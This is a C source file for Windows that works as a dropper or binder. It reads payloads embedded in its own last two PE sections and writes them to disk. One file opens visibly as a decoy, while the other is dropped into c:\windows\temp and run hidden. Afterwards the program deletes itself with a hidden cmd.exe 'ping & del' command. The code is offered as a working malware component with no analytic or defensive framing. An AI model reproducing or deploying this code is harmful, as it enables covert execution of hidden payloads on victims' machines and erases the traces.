#include <stdio.h>
#include <Windows.h>

int flag = 0;

char* getCurrentExePath() {
    char* exePath = (char*)malloc(MAX_PATH);
    if (!exePath) {
        return "";
    }
    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len == 0) {
        free(exePath);
        return "";
    }
    return exePath;
}

void readSection(FILE* file, PIMAGE_SECTION_HEADER sectionHeader, BOOL isTemp) {
    if (sectionHeader->SizeOfRawData > 0) {
        fseek(file, sectionHeader->PointerToRawData, SEEK_SET);
        BYTE* sectionContent = (BYTE*)malloc(sectionHeader->SizeOfRawData);
        if (!sectionContent) {
            printf("Failed to allocate memory for section content.\n");
            fclose(file);
            return;
        }
        if (fread(sectionContent, 1, sectionHeader->SizeOfRawData, file) != sectionHeader->SizeOfRawData) {
            printf("Failed to read section content.\n");
            free(sectionContent);
            fclose(file);
            return;
        }
        size_t offset = 0;
        while (offset < sectionHeader->SizeOfRawData) {
            if (sectionContent[offset] == '[' && sectionContent[offset + 1] == 'F' &&
                sectionContent[offset + 2] == 'I' && sectionContent[offset + 3] == 'L' &&
                sectionContent[offset + 4] == 'E' && sectionContent[offset + 5] == ']') {

                flag = 1;

                size_t extOffset = offset + 6;
                char ext[MAX_PATH] = { 0 };
                size_t len = 0;
                while (sectionContent[extOffset + len] != '#' && sectionContent[extOffset + len] != '\0' &&
                    len < MAX_PATH) {
                    ext[len++] = sectionContent[extOffset + len];
                }

                size_t fileDataOffset = offset + MAX_PATH;

                size_t nextFileOffset = fileDataOffset;
                while (nextFileOffset < sectionHeader->SizeOfRawData &&
                    !(sectionContent[nextFileOffset] == '[' && sectionContent[nextFileOffset + 1] == 'E' &&
                        sectionContent[nextFileOffset + 2] == 'N' && sectionContent[nextFileOffset + 3] == 'D' &&
                        sectionContent[nextFileOffset + 4] == ']')) {
                    nextFileOffset++;
                }

                size_t fileContentLen = nextFileOffset - fileDataOffset;

                FILE* outFile;
                char fileName[MAX_PATH] = { 0 };

                if (isTemp == TRUE) {
                    snprintf(fileName, MAX_PATH, "c:\\windows\\temp\\%s", ext);
                }
                else {
                    snprintf(fileName, MAX_PATH, "%s", ext);
                }

                fopen_s(&outFile, fileName, "wb");

                if (outFile) {
                    fwrite(sectionContent + fileDataOffset, 1, fileContentLen, outFile);
                    fclose(outFile);

                    SHELLEXECUTEINFOA pngexecute = { 0 };
                    pngexecute.cbSize = sizeof(pngexecute);
                    pngexecute.lpFile = fileName;

                    if (isTemp == FALSE) {
                        pngexecute.nShow = SW_SHOW;
                    }
                    else {
                        pngexecute.nShow = SW_HIDE;
                    }
                    ShellExecuteExA(&pngexecute);

                    Sleep(100);

                }
                else {
                    printf("Failed to open output file: %s\n", fileName);
                }

                offset = nextFileOffset;
            }
            else {
                offset++;
            }
        }

        free(sectionContent);
    }

}

void getSectionHeader(char* filePath) {
    FILE* file;
    if (fopen_s(&file, filePath, "rb") != 0) {
        printf("Failed to open file: %s\n", filePath);
        return;
    }
    IMAGE_DOS_HEADER dosHeader;
    if (fread(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, file) != 1) {
        printf("Failed to read DOS header.\n");
        fclose(file);
        return;
    }
    fseek(file, dosHeader.e_lfanew, SEEK_SET);
    IMAGE_NT_HEADERS ntHeaders;
    if (fread(&ntHeaders, sizeof(IMAGE_NT_HEADERS), 1, file) != 1) {
        printf("Failed to read NT headers.\n");
        fclose(file);
        return;
    }
    fseek(file, dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS), SEEK_SET);

    DWORD numberOfSections = ntHeaders.FileHeader.NumberOfSections;
    if (numberOfSections < 2) {
        printf("Not enough sections to retrieve.\n");
        fclose(file);
        return;
    }

    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)malloc(sizeof(IMAGE_SECTION_HEADER) * numberOfSections);
    if (!sectionHeaders) {
        printf("Failed to allocate memory for section headers.\n");
        fclose(file);
        return;
    }

    if (fread(sectionHeaders, sizeof(IMAGE_SECTION_HEADER), numberOfSections, file) != numberOfSections) {
        printf("Failed to read section headers.\n");
        free(sectionHeaders);
        fclose(file);
        return;
    }

    IMAGE_SECTION_HEADER* secondLastSection = &sectionHeaders[numberOfSections - 2];
    readSection(file, secondLastSection, FALSE);

    IMAGE_SECTION_HEADER* lastSection = &sectionHeaders[numberOfSections - 1];
    readSection(file, lastSection, TRUE);

    free(sectionHeaders);

    fclose(file);
}

void removeSelf() {
    char filePath[MAX_PATH];
    GetModuleFileNameA(NULL, filePath, MAX_PATH);

    char cmd[MAX_PATH];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c ping 127.0.0.1 -n 2 > nul & del \"%s\"", filePath);

    ShellExecuteA(NULL, "open", "cmd.exe", cmd, NULL, SW_HIDE);
}

int tempMain() {

    char* exePath = getCurrentExePath();

    getSectionHeader(exePath);

    if (flag) {
        removeSelf();

        exit(0);
    }


    return 0;
}